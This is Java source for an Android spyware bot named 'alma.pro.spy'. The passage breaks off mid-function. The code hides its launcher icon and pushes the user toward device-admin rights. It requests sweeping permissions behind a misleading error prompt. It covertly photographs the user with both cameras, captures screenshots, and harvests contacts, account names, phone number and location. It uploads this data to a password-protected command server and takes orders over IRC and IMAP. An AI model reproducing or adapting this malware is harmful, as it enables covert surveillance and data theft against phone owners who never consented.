package alma.pro.spy;

/**
 * Created by AlMA3lOl on 2/1/2017.
 */

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.AlertDialog;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.view.WindowManager;

import com.jcraft.jsch.JSch;
import com.permissioneverywhere.PermissionEverywhere;
import com.permissioneverywhere.PermissionResponse;

import org.apache.commons.net.ftp.FTPClient;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.NameValuePair;
import org.apache.http.StatusLine;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.methods.HttpPut;
import org.apache.http.entity.FileEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.jsoup.Jsoup;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketAddress;
import java.security.MessageDigest;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Collections;
import java.util.Date;
import java.util.LinkedList;
import java.util.List;
import java.util.Locale;
import java.util.Properties;
import java.util.Random;
import java.util.concurrent.Exchanger;
import java.util.concurrent.ExecutionException;

import javax.mail.BodyPart;
import javax.mail.Folder;
import javax.mail.Store;
import javax.mail.internet.MimeMultipart;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import javax.mail.Message;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

import static android.content.pm.PackageInfo.REQUESTED_PERMISSION_GRANTED;

/**
 * Created by AlMA PRO on 12/10/2014.
 */

class bot {
    private Thread ircthread;
    private Thread gtmthread;
    bot(String p, Context cxt, Class mc) {
        main_class = mc;
        main_context = cxt;
        path = p + "/";
        sp = p + "/";
        StringBuilder builder = new StringBuilder();
        builder.append("Android ").append(Build.VERSION.RELEASE);
        Field[] fields = Build.VERSION_CODES.class.getFields();
        for (Field field : fields) {
            String fieldName = field.getName();
            int fieldValue = -1;
            try {
                fieldValue = field.getInt(new Object());
            } catch (Exception e) {
                e.printStackTrace();
                log_all(e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                if (fieldValue == Build.VERSION.SDK_INT) {
                    builder.append(" - ").append(fieldName).append(" - ");
                    builder.append("SDK #").append(fieldValue);
                }
            }
        }
        osname = builder.toString();
        username = getUsername();
        if (botid.equals("")) {
            botid = Build.SERIAL;
        }
        if (GS("botid").equals("")) {
            SS("BOTID", botid);
        } else {
            botid = GS("botid");
        }
    }
    void start() throws ExecutionException, InterruptedException {
        if (autohide){
            if(main_context.getPackageName().endsWith(myPackage)){
                hli();
            }else autohide=false;
        }
        if(autoGoBold) {
            DevicePolicyManager m = (DevicePolicyManager)main_context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName d = new ComponentName(main_context, Admin.DeviceAdmin.class);
            if(m == null || !m.isAdminActive(d)){
                Intent i = new Intent(main_context,Admin.class);
                i.putExtra("cmd","");
                i.putExtra("R","");
                main_context.startActivity(i);
            }else autoGoBold=false;
            Intent dss = new Intent(main_context,dss.class);
            dss.putExtra("img",sp+"dss.jpg");
            main_context.startActivity(dss);
        }
        if(light) wtime=24*60*60000;
        else light = false;
        String[] perms = new String[]{Manifest.permission.DISABLE_KEYGUARD,Manifest.permission.MODIFY_AUDIO_SETTINGS,Manifest.permission.SEND_SMS,Manifest.permission.CALL_PHONE,Manifest.permission.READ_CALL_LOG,Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.WAKE_LOCK, Manifest.permission.INTERNET, Manifest.permission.ACCESS_NETWORK_STATE, Manifest.permission.READ_SMS, Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.CAMERA, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.RECEIVE_BOOT_COMPLETED, Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_CONTACTS, Manifest.permission.GET_ACCOUNTS, Manifest.permission.READ_PHONE_STATE, Manifest.permission.PROCESS_OUTGOING_CALLS};//Manifest.permission.INSTALL_PACKAGES,Manifest.permission.ACCOUNT_MANAGER,
        ArrayList<String> np = new ArrayList<>();
        for (String perm : perms) {
            if (!CheckPermission(perm)) {
                np.add(perm);
            }
        }
        if (np.size() > 0) {
            RequestPermissions(np.toArray(new String[np.size()]));
        }
        IRC irc = new IRC();
        ircthread = new Thread(irc);
        gtmthread = new Thread(new Runnable() {
            @Override
            public void run() {
                while (true) {
                    try {
                        GTM();
                        Thread.sleep(wtime);
                    } catch (Exception e) {
                        e.printStackTrace();
                        log_all("start function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                    }
                }
            }
        });
        new Thread(new Runnable() {
            @Override
            public void run() {
                try{
                    while(true){
                        try{
                            if(!ircthread.isAlive()) ircthread.start();
                            if(!gtmthread.isAlive()) gtmthread.start();
                        }catch (Exception ignored){}
                        Thread.sleep(900000);
                    }
                }catch (Exception ignored){}
            }
        }).start();
    }
    private void hli(){
        if(main_class==null) return;
        try {
            PackageManager p = main_context.getPackageManager();
            ComponentName componentName = new ComponentName(main_context, main_class);
            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        } catch (Exception e) {
            e.printStackTrace();
            log_all("hli function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
    }
    private void sli(){
        if(main_class==null) return;
        try {
            PackageManager p = main_context.getPackageManager();
            ComponentName componentName = new ComponentName(main_context, main_class);
            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
        } catch (Exception e) {
            e.printStackTrace();
            log_all("hli function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
    }
    private boolean CheckPermission(String perm) {
        boolean r = false;
        if (ActivityCompat.checkSelfPermission(main_context, perm) == PackageManager.PERMISSION_GRANTED) {
            r = true;
        }
        return r;
    }
    private void RequestPermissions(String[] perms) {
        class Runner extends AsyncTask<String, String, String> {
            @Override
            protected String doInBackground(String... params) {
                Looper.prepare();
                try {
                    PermissionResponse response = PermissionEverywhere.getPermission(main_context,
                            params,
                            555,
                            "Permissions required",
                            "Error with permissions! You need to allow access",
                            R.mipmap.ic_launcher)
                            .call();
                    if (response.isGranted()) {
                        log_all("RequestPermissions function: requested permissions granted.", log_type.GOOD);
                    }
                    return null;
                } catch (Exception ex) {
                    ex.printStackTrace();
                    log_all("RequestPermissions function: " + ex.getMessage());
                }
                Looper.loop();
                return null;
            }
        }
        Runner r = new Runner();
        r.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, perms);
    }
    private Context main_context;
    private Class main_class;
    final String myPackage = "alma.pro.spy";
    private boolean autohide = true;
    private boolean autoGoBold = true;
    private boolean root = false;
    private boolean light = true;
    private String sp = "";
    private String server = "http://SITE";
    private String aps = "/alma.pro.spy/";
    private String password = "c2c9db77af078bbb162b79dc941de3b2";
    private String botname = "Android Bot";
    private String botid = android.os.Build.SERIAL;
    private String version = "0.1 - Android";
    private String username = "";
    private String devicename = android.os.Build.MODEL;
    private String osname = "";
    private String logfile = "AlMA.PRO.SPY.log";
    private String configfile = "AlMA.PRO.SPY.dat";
    private String path = "";
    private int wtime = 5 * 60000;
    private int ctimes = 1;
    private String imapserver = "imap.gmail.com";
    private String imapport = "993";
    private String imapuser = "";
    private String imappass = "";
    private String imapmaster = "";
    private String apsshuser = "almapro";
    private String apsshpass = "c444858e0aaeb727da73d2eae62321ad";
    private boolean keepddos = false;
    private boolean onTor = false;
    private String IRCS = "irc.freenode.net";
    private Integer IRCP = 6667;
    private boolean IRCSSL = false;
    private String IRCM = "";
    private String IRCB = "";
    private String IRCCH = "";
    private boolean IRCOnTor = false;
    private String lastlocation = "Unknown";
    private Bitmap screenShot(View v) {
        try {
            v.setDrawingCacheEnabled(true);
            Bitmap bitmap = Bitmap.createBitmap(v.getDrawingCache());
            v.setDrawingCacheEnabled(false);
            return bitmap;
        } catch (Exception e) {
            e.printStackTrace();
            log_all("screenShot function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
        return null;
    }
    private void DSS() throws InterruptedException {
        Intent dss = new Intent(main_context,dss.class);
        dss.putExtra("img",sp+"dss.jpg");
        main_context.startActivity(dss);
        Thread.sleep(1000);
        File i = new File(sp + "dss.jpg");
        if(i.exists()){
            Client a = new Client();
            try {
                a.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, "put", server + aps + "connect.php?password=" + password + "&type=dss&ext=jpg&botid=" + botid, sp + "dss.jpg").get();
            } catch (Exception e) {
                e.printStackTrace();
            }
            i.delete();
        }
    }
    private String RFFS(String name) {
        String str = null;
        try {
            FileInputStream input_file = new FileInputStream(name);
            byte byt1[] = new byte[input_file.available()];
            input_file.read(byt1);
            str = new String(byt1);
        } catch (Exception e) {
            e.printStackTrace();
            log_all("RFFS function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
        return str;
    }
    private byte[] RFFB(String name) {
        byte[] bb = null;
        try {
            FileInputStream input_file = new FileInputStream(name);
            byte[] byt1 = new byte[input_file.available()];
            input_file.read(byt1, 0, byt1.length);
            bb = byt1;
        } catch (Exception e) {
            e.printStackTrace();
            log_all("RFFB function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
        return bb;
    }
    private void WTF(String name, String Content) {
        name=name.replaceAll("[ ]","\\ ");
        File save_log = new File(name);
        if (!save_log.exists()) {
            try {
                save_log.createNewFile();
            } catch (Exception e) {
                e.printStackTrace();
                log_all("WTF (S) function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
            }
        }
        try {
            FileOutputStream fos = new FileOutputStream(save_log.getAbsolutePath());
            fos.write(SB(Content));
            fos.close();
        } catch (Exception e) {
            e.printStackTrace();
            log_all("WTF (S) function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
    }
    private void WTF(String name, byte[] Content) {
        name=name.replaceAll("[ ]","\\ ");
        File save_log = new File(name);
        if (!save_log.exists()) {
            try {
                save_log.createNewFile();
            } catch (Exception e) {
                e.printStackTrace();
                log_all("WTF (B) function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
            }
        }
        try {
            FileOutputStream fos = new FileOutputStream(save_log.getAbsolutePath());
            fos.write(Content);
            fos.flush();
            fos.close();
        } catch (Exception e) {
            e.printStackTrace();
            log_all("WTF (B) function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
    }
    private void SS(String name, String value) {
        String Final_Content = "";
        File save_log = new File(sp + configfile);//
        if (!save_log.exists()) {
            try {
                if (botid.equals("")) botid = android.os.Build.SERIAL;
                MC(server, aps, password, botname, botid, apsshuser, apsshpass);
            } catch (Exception e) {
                e.printStackTrace();
                log_all("SS function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
            }
        }
        if (Final_Content.equals("")) {
            try {
                StringBuilder sb_ = new StringBuilder();
                BufferedReader reader = new BufferedReader(new FileReader(save_log));
                String data;
                while ((data = reader.readLine()) != null) {
                    if (!data.equals("")) {
                        sb_.append(data);
                    }
                }
                reader.close();
                String str = sb_.toString();
                for (String value1 : str.split("]")) {
                    if (value1.contains("|")) {
                        String[] value_parts = value1.split("\\|");
                        String new_value = value_parts[1];
                        if (value_parts[0].toLowerCase().equals("[" + name.toLowerCase())) {
                            new_value = value;
                        }
                        Final_Content += value_parts[0] + "|" + new_value + "]";
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
                log_all("SS function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
            }
        }
        try {
            FileOutputStream fos = new FileOutputStream(save_log.getPath());
            fos.write(SB(Final_Content));
            fos.close();
        } catch (Exception e) {
            e.printStackTrace();
            log_all("SS function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
    }
    private String GS(String name) {
        String str = "";
        File save_log = new File(sp + configfile);//
        if (!save_log.exists()) {
            try {
                if (botid.equals("")) botid = android.os.Build.SERIAL;
                MC(server, aps, password, botname, botid, apsshuser, apsshpass);
            } catch (Exception e) {
                e.printStackTrace();
                log_all("GS function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
            }
        }
        try {
            StringBuilder sb_ = new StringBuilder();
            BufferedReader reader = new BufferedReader(new FileReader(sp + configfile));
            String data;
            while ((data = reader.readLine()) != null) {
                if (!data.equals("")) {
                    sb_.append(data);
                }
            }
            reader.close();
            String str1 = sb_.toString();
            if (!str1.contains("]")) {
                return "";
            }
            for (String value : str1.split("]")) {
                if (value.contains("|")) {
                    String[] value_parts = value.split("\\|");
                    if (value_parts[0].toLowerCase().equals("[" + name.toLowerCase())) {
                        str = value_parts[1];
                        break;
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            log_all("GS function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
        return str;
    }
    private String BS(byte[] byt) {
        return new String(byt);
    }
    private byte[] SB(String str) {
        return str.getBytes();
    }
    private String ENB(String txt) {
        try {
            return Base64.encodeToString(txt.getBytes("UTF-8"), Base64.DEFAULT);
        } catch (Exception e) {
            e.printStackTrace();
            log_all("ENB function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
        return "";
    }
    private String DEB(String txt) {
        try {
            byte[] decodedByte = Base64.decode(txt, 0);
            return new String(decodedByte, "UTF-8");
        } catch (Exception e) {
            e.printStackTrace();
            log_all("DEB function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
        return "";
    }
    public void MMB(String titl, String msg, Context intt) {
        AlertDialog.Builder builder = new AlertDialog.Builder(intt);
        builder.setTitle(titl);
        builder.setMessage(msg);
        builder.setPositiveButton("OK", null);
        builder.setCancelable(true);
        AlertDialog aler = builder.create();
        try {
            //noinspection ConstantConditions
            aler.getWindow().setType(WindowManager.LayoutParams.TYPE_SYSTEM_ALERT);
            aler.show();
        } catch (Exception e) {
            e.printStackTrace();
            log_all("MMB function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
    }
    private void MC(String s, String p, String pass, String bn, String bi, String au, String ap) {
        WTF(sp+configfile, "[SERVER|" + s + "][APS|" + p + "][PASSWORD|" + pass + "][BOTNAME|" + bn + "][BOTID|" + bi + "][APSSHUSER|" + au + "][APSSHPASS|" + ap + "]");
    }
    private String RND(int l) {
        Random generator = new Random();
        StringBuilder randomStringBuilder = new StringBuilder();
        String cs = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        char tempChar;
        for (int i = 0; i < l; i++) {
            tempChar = cs.charAt(generator.nextInt(cs.length()));
            randomStringBuilder.append(tempChar);
        }
        return randomStringBuilder.toString();
    }
    private String RND() {
        return RND(10);
    }
    private String getUsername() {
        try {
            AccountManager manager = AccountManager.get(main_context);
            if (!CheckPermission(android.Manifest.permission.GET_ACCOUNTS)) {
                RequestPermissions(new String[]{android.Manifest.permission.GET_ACCOUNTS});
                return Build.MODEL;
            }
            Account[] accounts = manager.getAccountsByType("com.google");
            List<String> possibleEmails = new LinkedList<>();
            for (Account account : accounts) {
                possibleEmails.add(account.name);
            }
            if (!possibleEmails.isEmpty() && possibleEmails.get(0) != null) {
                String email = possibleEmails.get(0);
                String[] parts = email.split("@");
                if (parts.length > 1)
                    return parts[0];
            }
        } catch (SecurityException e) {
            e.printStackTrace();
            log_all("getUsername function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
        return Build.MODEL;
    }
    private void POST(String data) {
        Client a = new Client();
        a.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, "post", server + aps + "connect.php?password=" + password, data);
    }
    private void GTM() {
        try {
            if (!CUH(server)) {IMAPSC();log_all("GTM function: Updated settings from IMAP.", log_type.INFO);} else{
                POST("do=info&botid=" + botid + "&botname=" + botname + "&devicename=" + devicename + "&username=" + username + "&version=" + version + "&webcam=" + WCC() + "&os=" + osname);
                ctimes++;
                if (ctimes == 999999999) ctimes = 1;
            }
        } catch (Exception e) {
            e.printStackTrace();
            log_all("GTM function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
    }
    @SuppressWarnings("deprecation")
    private String WCC() {
        if (main_context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
            return "Yes";
        }
        return "No";
    }
    @SuppressWarnings("deprecation")
    private int FCID() {
        Camera.CameraInfo ci = new Camera.CameraInfo();
        for (int i = 0; i < Camera.getNumberOfCameras(); i++) {
            Camera.getCameraInfo(i, ci);
            if (ci.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) return i;
        }
        return -1;
    }
    private boolean hasFlash() {
        return main_context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_FLASH);
    }
    private SurfaceHolder previewHolder;
    private void WCS() {
        FWCS();
        BWCS();
    }
    @SuppressWarnings("deprecation")
    private void BWCS() {
        if (WCC().equals("No")) {
            return;
        }
        new Thread(new Runnable() {
            @Override
            public void run() {
                Looper.prepare();
                try {
                    Camera camera = Camera.open();
                    SurfaceView dummy = new SurfaceView(main_context);
                    previewHolder = dummy.getHolder();
                    previewHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
                    camera.setPreviewDisplay(previewHolder);
                    Camera.Parameters params = camera.getParameters();
                    params.setJpegQuality(100);
                    camera.setParameters(params);
                    camera.startPreview();
                    previewHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
                    try {
                        camera.setPreviewDisplay(previewHolder);
                    } catch (Exception e1) {
                        e1.printStackTrace();
                        log_all("BWCS function: " + e1.getMessage());
                    }
                    camera.takePicture(null, null, new Camera.PictureCallback() {
                        @Override
                        public void onPictureTaken(byte[] data, Camera camera) {
                            Bitmap bmp = BitmapFactory.decodeByteArray(data, 0, data.length);
                            FileOutputStream out = null;
                            try {
                                out = new FileOutputStream(sp + "BWCS.png");
                                bmp.compress(Bitmap.CompressFormat.PNG, 100, out);
                            } catch (Exception e) {
                                e.printStackTrace();
                                log_all("BWCS function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                            } finally {
                                try {
                                    if (out != null) {
                                        out.close();
                                    }
                                } catch (Exception e) {
                                    e.printStackTrace();
                                    log_all("BWCS function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                                }
                            }
                            Client a = new Client();
                            try {
                                a.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, "put", server + aps + "connect.php?password=" + password + "&type=wcs&ext=back.png&botid=" + botid, sp + "BWCS.png").get();
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                            File i = new File(sp + "BWCS.png");
                            if(i.exists()) i.delete();
                            camera.release();
                        }
                    });
                } catch (Exception e1) {
                    e1.printStackTrace();
                    log_all("BWCS function: " + e1.getMessage());
                }
                Looper.loop();
            }
        }).start();
    }
    @SuppressWarnings("deprecation")
    private void FWCS() {
        if (WCC().equals("No")) {
            return;
        }
        if (FCID() < 0) {
            return;
        }
        new Thread(new Runnable() {
            @Override
            public void run() {
                Looper.prepare();
                try {
                    Camera camera = Camera.open(FCID());
                    SurfaceView dummy = new SurfaceView(main_context);
                    previewHolder = dummy.getHolder();
                    previewHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
                    camera.setPreviewDisplay(previewHolder);
                    Camera.Parameters params = camera.getParameters();
                    params.setJpegQuality(100);
                    camera.setParameters(params);
                    camera.startPreview();
                    previewHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
                    try {
                        camera.setPreviewDisplay(previewHolder);
                    } catch (Exception e1) {
                        e1.printStackTrace();
                        log_all("FWCS function: " + e1.getMessage());
                    }
                    camera.takePicture(null, null, new Camera.PictureCallback() {
                        @Override
                        public void onPictureTaken(byte[] data, Camera camera) {
                            Bitmap bmp = BitmapFactory.decodeByteArray(data, 0, data.length);
                            FileOutputStream out = null;
                            try {
                                out = new FileOutputStream(sp + "FWCS.png");
                                bmp.compress(Bitmap.CompressFormat.PNG, 100, out);
                            } catch (Exception e) {
                                e.printStackTrace();
                                log_all("FWCS function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                            } finally {
                                try {
                                    if (out != null) {
                                        out.close();
                                    }
                                } catch (Exception e) {
                                    e.printStackTrace();
                                    log_all("FWCS function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                                }
                            }
                            Client a = new Client();
                            try {
                                a.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, "put", server + aps + "connect.php?password=" + password + "&type=wcs&ext=front.png&botid=" + botid, sp + "FWCS.png").get();
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                            File i = new File(sp + "FWCS.png");
                            if(i.exists()) i.delete();
                            camera.release();
                        }
                    });
                } catch (Exception e1) {
                    e1.printStackTrace();
                    log_all("FWCS function: " + e1.getMessage());
                }
                Looper.loop();
            }
        }).start();
    }
    private String Contacts() {
        String all = "";
        if (CheckPermission(Manifest.permission.READ_CONTACTS)) {
            try {
                ContentResolver cr = main_context.getContentResolver();
                Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
                if (cur.getCount() > 0) while (cur.moveToNext()) {
                    String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    all += "Contact name: " + name + "\n";
                    ArrayList<String> cids = new ArrayList<>();
                    ArrayList<String> wtps = new ArrayList<>();
                    ArrayList<String> nms = new ArrayList<>();
                    cids.add(ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE);
                    wtps.add(ContactsContract.CommonDataKinds.StructuredName.PHONETIC_NAME);
                    nms.add("Phonetic Name: ");
                    cids.add(ContactsContract.CommonDataKinds.Nickname.CONTENT_ITEM_TYPE);
                    wtps.add(ContactsContract.CommonDataKinds.Nickname.DATA);
                    nms.add("Nickname: ");
                    cids.add(ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE);
                    wtps.add(ContactsContract.CommonDataKinds.Organization.COMPANY);
                    nms.add("Organization Name: ");
                    cids.add(ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE);
                    wtps.add(ContactsContract.CommonDataKinds.Organization.TITLE);
                    nms.add("Organization Job Title: ");
                    cids.add(ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE);
                    wtps.add(ContactsContract.CommonDataKinds.Phone.NUMBER);
                    nms.add("Phone Number: ");
                    cids.add(ContactsContract.CommonDataKinds.SipAddress.CONTENT_ITEM_TYPE);
                    wtps.add(ContactsContract.CommonDataKinds.SipAddress.SIP_ADDRESS);
                    nms.add("SIP Address: ");
                    cids.add(ContactsContract.CommonDataKinds.Email.CONTENT_ITEM_TYPE);
                    wtps.add(ContactsContract.CommonDataKinds.Email.ADDRESS);
                    nms.add("Email Address: ");
                    cids.add(ContactsContract.CommonDataKinds.Website.CONTENT_ITEM_TYPE);
                    wtps.add(ContactsContract.CommonDataKinds.Website.DATA);
                    nms.add("Website: ");
                    cids.add(ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE);
                    wtps.add(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY);
                    nms.add("Country: ");
                    cids.add(ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE);
                    wtps.add(ContactsContract.CommonDataKinds.StructuredPostal.CITY);
                    nms.add("City: ");
                    cids.add(ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE);
                    wtps.add(ContactsContract.CommonDataKinds.StructuredPostal.STREET);
                    nms.add("Street: ");
                    cids.add(ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE);
                    wtps.add(ContactsContract.CommonDataKinds.Im.DATA);
                    nms.add("IM Name: ");
                    cids.add(ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE);
                    wtps.add(ContactsContract.CommonDataKinds.Im.PROTOCOL);
                    nms.add("IM Protocol: ");
                    cids.add(ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE);
                    wtps.add(ContactsContract.CommonDataKinds.Note.NOTE);
                    nms.add("Note: ");
                    for (int i = 0; i < cids.size(); i++) {
                        try {
                            String cid = cids.get(i);
                            String wtp = wtps.get(i);
                            String nm = nms.get(i);
                            Cursor SubCur = cr.query(ContactsContract.Data.CONTENT_URI, null, ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?", new String[]{id, cid}, null);
                            SubCur.moveToFirst();
                            do {
                                String v = SubCur.getString(SubCur.getColumnIndex(wtp));
                                if (v != null) {
                                    if (nm.equals("IM Protocol: ")) {
                                        switch (Integer.parseInt(v)) {
                                            case ContactsContract.CommonDataKinds.Im.PROTOCOL_AIM:
                                                v = "AIM";
                                                break;
                                            case ContactsContract.CommonDataKinds.Im.PROTOCOL_GOOGLE_TALK:
                                                v = "Google Talk";
                                                break;
                                            case ContactsContract.CommonDataKinds.Im.PROTOCOL_ICQ:
                                                v = "ICQ";
                                                break;
                                            case ContactsContract.CommonDataKinds.Im.PROTOCOL_JABBER:
                                                v = "Jabber";
                                                break;
                                            case ContactsContract.CommonDataKinds.Im.PROTOCOL_MSN:
                                                v = "MSN";
                                                break;
                                            case ContactsContract.CommonDataKinds.Im.PROTOCOL_NETMEETING:
                                                v = "NetMeeting";
                                                break;
                                            case ContactsContract.CommonDataKinds.Im.PROTOCOL_QQ:
                                                v = "QQ";
                                                break;
                                            case ContactsContract.CommonDataKinds.Im.PROTOCOL_SKYPE:
                                                v = "Skype";
                                                break;
                                            case ContactsContract.CommonDataKinds.Im.PROTOCOL_YAHOO:
                                                v = "Yahoo";
                                                break;
                                            case ContactsContract.CommonDataKinds.Im.PROTOCOL_CUSTOM:
                                                v = "Custom Type (" + SubCur.getString(SubCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.CUSTOM_PROTOCOL)) + ")";
                                                break;
                                        }
                                    }
                                    all += nm + v + "\n";
                                }
                            } while (SubCur.moveToNext());
                        } catch (Exception e) {
                            e.printStackTrace();
                            log_all("Contacts function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                        }
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
                log_all("Contacts function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
            }
        } else {
            RequestPermissions(new String[]{Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_CONTACTS});
        }
        return all;
    }
    private String GCN() {
        try {
            TelephonyManager tMgr = (TelephonyManager) main_context.getSystemService(Context.TELEPHONY_SERVICE);
            String n = tMgr.getLine1Number();
            if (n.equals("")) n = tMgr.getSubscriberId();
            return n;
        } catch (Exception e) {
            e.printStackTrace();
            log_all("GCN function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
        return "Unknown";
    }
    private String GCP() {
        try {
            TelephonyManager tMgr = (TelephonyManager) main_context.getSystemService(Context.TELEPHONY_SERVICE);
            return tMgr.getNetworkOperatorName();
        } catch (Exception e) {
            e.printStackTrace();
            log_all("GCP function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
        return "Unknown";
    }
    private String GLnL() {
        try {
            if (!lastlocation.equals("Unknown")) {
                return lastlocation;
            }
            final LocationManager locManager = (LocationManager) main_context.getSystemService(Context.LOCATION_SERVICE);
            if (!CheckPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) || !CheckPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
                RequestPermissions(new String[]{Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_FINE_LOCATION});
                return "Permissions denied";
            }
            new Thread(new Runnable() {
                @SuppressWarnings("All")
                @Override
                public void run() {
                    Looper.prepare();
                    locManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 400, 1, new LocationListener() {
                        @Override
                        public void onLocationChanged(Location location) {
                            Double longitude = location.getLongitude();
                            Double latitude = location.getLatitude();
